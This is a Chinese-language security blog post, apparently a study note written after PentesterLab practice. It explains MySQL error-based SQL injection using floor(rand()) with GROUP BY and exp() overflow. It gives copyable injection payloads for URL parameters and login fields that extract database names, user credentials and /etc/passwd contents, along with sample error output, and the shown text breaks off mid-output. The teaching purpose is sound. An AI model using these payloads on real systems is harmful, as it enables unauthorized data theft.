<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="再探SQL报错注入, hybcx&#39;s blog">
    <meta name="description" content="0x01 前言
本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。
0x02 rand和order by报错注入
一般意义上来说，我们常用的显错注入手段是这两个">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-BYTY196ENH');
    </script>


    <title>再探SQL报错注入 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">再探SQL报错注入</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">
                                <span class="chip bg-color">基本知识</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="post-category">
                                web知识总结
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-12-14
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-02-03
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    6.7k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    30 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 前言</h1>
<p>本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。</p>
<h1>0x02 rand和order by报错注入</h1>
<p>一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句</p>
<pre class="line-numbers language-none"><code class="language-none">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.
译文：
每次执行 WHERE 时，都会重新计算 WHERE 子句中的 RAND()。不能在 ORDER BY 子句中使用带有 RAND() 值的列，因为 ORDER BY 会多次计算该列。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>也就是说不能作为order by的条件字段，group by同理，所以有如下payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>concat<span class="token punctuation">(</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">+</span><span class="token keyword">group</span><span class="token operator">+</span><span class="token keyword">by</span><span class="token operator">+</span>a<span class="token punctuation">)</span>b<span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其中a为:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>concat<span class="token punctuation">(</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>后面又group by a，所以会爆出</p>
<pre class="line-numbers language-none"><code class="language-none">Duplicate entry ‘XXXXXXXXXX’ for key ‘group_key’
译文：
密钥“group_key”的条目“XXXXXXXXXX”重复<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>其中XXXXX就是<code>0x5f,database(),0x5f,user(),0x5f,version()</code>的内容，这样一步步就能拿到想要的信息</p>
<p>在前面的payload中其实还有个很重要的函数是floor()取整，在之前的文章中研究过，floor(rand(0)*2)这样会产生重复的随机数，从而在order by时候报错。</p>
<p>接下来详细分析一波上述payload的原理：</p>
<h2 id="Floor（）函数">Floor（）函数</h2>
<pre class="line-numbers language-none"><code class="language-none">floor（），rand（），count（），group by联合使用：
floor（）：向下取整
rand（）：生成一个0-1之间的随机数，不包括0和1
count（*）：统计某个表下面一共有多少记录
group by XXX：按照一定的规则对XXX进行排序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>报错原理：group by和rand（）联合使用的时候，如果临时表中没有该主键，则再插入的之前会再计算一次rand（），然后再由group by将计算出来的主键直接插入到临时表格之中，导致主键重复，然后报错。<br>
<img src="image-20231214210526397.png" alt="image-20231214210526397"></p>
<p><img src="image-20231214210545841.png" alt="image-20231214210545841"></p>
<p>上述是这些函数的简单用法，以下不想费劲搭环境了，直接照搬师傅的了。。。</p>
<p><img src="image-20231214210918104.png" alt="image-20231214210918104"></p>
<p>在这里使用group by的时候回生成一张临时表，也叫做虚拟表，而且表都是有主键的，作为主键的列是不能由重复的，好比第一个值的主键为1，那么就不能再有主键为1的值了，接下来可以再是2、3…</p>
<p><img src="image-20231215163639852.png" alt="image-20231215163639852"></p>
<p><img src="image-20231215163654153.png" alt="image-20231215163654153"></p>
<p>可以看到上述两幅图片中第二幅图片的序列明显更规律（也就是伪序列）</p>
<p>首先这是一个虚拟表，自然就有主键。当使用group by去读这些数据的时候，好比上面这个伪随机序列，读完第一列，发现主键之中没有0这个数字，但由于rand的存在，他不会立刻插入，而是会继续运算一次rand函数，然后经过floor之后0变成了1，随后率先插入的数字便成了1。然后取第二条数据，此时floor之后为数字1，但该虚拟表中已经有了1，则该数字1对应的值自增1，继续从from的表中取第三条记录，再次计算floor(rand(0)*2)，结果为0，由于表中不存在数字0，则继续rand一次，经过floor之后成了1，但根据特性，该数字1会硬插入该虚拟表中，导致了数字1的重复，最终报错</p>
<p><img src="image-20231215163957161.png" alt="image-20231215163957161"></p>
<p>这里是个例子，将user（）的位置换做别的，就可以显示出别的错误了。<br>
爆库：</p>
<p><img src="image-20231215164013653.png" alt="image-20231215164013653"></p>
<p>可以看到使用的security，后面的数字1是rand（）函数产生的。</p>
<p><img src="image-20231215164151961.png" alt="image-20231215164151961"></p>
<p>这里可以看到具体信息了。其实就是利用了count的统计与group by的合作，然后基于主键唯一的机制，然后造成了这个错误。</p>
<p>模板payload大致如下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token punctuation">)</span>b<span class="token punctuation">;</span>  <span class="token comment">#第一种</span>

?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+  #第二种

?id=1'</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token comment">--+  #第二种</span>

?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select user()))x from information_schema.tables group by x)b)--+

uname=hybcx&amp;passwd=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token comment">#&amp;submit=Submit   #第三种</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>只需将上面模板中的内容替换成为我们的查询payload即可，a与b均是字段别名</p>
<p><img src="image-20231215165205920.png" alt="image-20231215165205920"></p>
<h1>0x03 EXP函数报错注入</h1>
<ul>
<li>作用：计算以e为底的幂值</li>
<li>语法：exp（X）</li>
<li>报错原理：当参数X超过了710之后，exp函数就会报错。</li>
</ul>
<p>MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数。</p>
<p><img src="image-20231215165453272.png" alt="image-20231215165453272"></p>
<p>该函数可以用来进行 MySQL 报错注入。但是为什么会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误：</p>
<p><img src="image-20231215165519117.png" alt="image-20231215165519117"></p>
<p>除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。</p>
<ul>
<li>使用版本：MySQL5.5.5 及以上版本</li>
</ul>
<p>现在我们已经知道当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误。那么我们在实际利用中如何让 exp() 报错的同时返回我们想要得到的数据呢？</p>
<p>我们可以用 <code>~</code> 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出：</p>
<p><img src="image-20231215165845068.png" alt="image-20231215165845068"></p>
<p>如上图所示，成功报错并输出了数据。但是事实证明，在 MySQL&gt;=5.5.53 之后，exp() 报错不能返回我们的查询结果，而只会得到一个报错：</p>
<p>下面由于实操的时候在安装MySQL低版本总是报错，我就直接照搬了（见谅~）</p>
<h2 id="注出数据">注出数据</h2>
<ul>
<li>得到表名：</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1690</span> <span class="token punctuation">(</span><span class="token number">22003</span><span class="token punctuation">)</span>: <span class="token keyword">DOUBLE</span> <span class="token keyword">value</span> <span class="token operator">is</span> <span class="token keyword">out</span> <span class="token keyword">of</span> range <span class="token operator">in</span> <span class="token string">'exp(~((select '</span>flag<span class="token punctuation">,</span>users<span class="token string">' from dual)))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>得到列名：</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1690</span> <span class="token punctuation">(</span><span class="token number">22003</span><span class="token punctuation">)</span>: <span class="token keyword">DOUBLE</span> <span class="token keyword">value</span> <span class="token operator">is</span> <span class="token keyword">out</span> <span class="token keyword">of</span> range <span class="token operator">in</span> <span class="token string">'exp(~((select '</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token string">' from dual)))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>检索数据：</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> exp<span class="token punctuation">(</span><span class="token operator">~</span> <span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token number">0x7c</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> <span class="token number">0x7c</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1690</span> <span class="token punctuation">(</span><span class="token number">22003</span><span class="token punctuation">)</span>: <span class="token keyword">DOUBLE</span> <span class="token keyword">value</span> <span class="token operator">is</span> <span class="token keyword">out</span> <span class="token keyword">of</span> range <span class="token operator">in</span> <span class="token string">'exp(~((select '</span><span class="token number">1</span><span class="token operator">|</span>admin<span class="token operator">|</span><span class="token number">123456</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">|</span>whoami<span class="token operator">|</span><span class="token number">657260</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">|</span>bunny<span class="token operator">|</span><span class="token number">864379</span><span class="token string">' from dual)))'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>读取文件（有13行的限制）：</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1690</span> <span class="token punctuation">(</span><span class="token number">22003</span><span class="token punctuation">)</span>: <span class="token keyword">DOUBLE</span> <span class="token keyword">value</span> <span class="token operator">is</span> <span class="token keyword">out</span> <span class="token keyword">of</span> range <span class="token operator">in</span> <span class="token string">'exp(~((select '</span>root:x:<span class="token number">0</span>:<span class="token number">0</span>:root:<span class="token operator">/</span>root:<span class="token operator">/</span>bin<span class="token operator">/</span>bash
daemon:x:<span class="token number">1</span>:<span class="token number">1</span>:daemon:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
bin:x:<span class="token number">2</span>:<span class="token number">2</span>:bin:<span class="token operator">/</span>bin:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
sys:x:<span class="token number">3</span>:<span class="token number">3</span>:sys:<span class="token operator">/</span>dev:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
sync:x:<span class="token number">4</span>:<span class="token number">65534</span>:sync:<span class="token operator">/</span>bin:<span class="token operator">/</span>bin<span class="token operator">/</span>sync
games:x:<span class="token number">5</span>:<span class="token number">60</span>:games:<span class="token operator">/</span>usr<span class="token operator">/</span>games:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
man:x:<span class="token number">6</span>:<span class="token number">12</span>:man:<span class="token operator">/</span>var<span class="token operator">/</span>cache<span class="token operator">/</span>man:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
lp:x:<span class="token number">7</span>:<span class="token number">7</span>:lp:<span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>lpd:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
mail:x:<span class="token number">8</span>:<span class="token number">8</span>:mail:<span class="token operator">/</span>var<span class="token operator">/</span>mail:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
news:x:<span class="token number">9</span>:<span class="token number">9</span>:news:<span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>news:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin
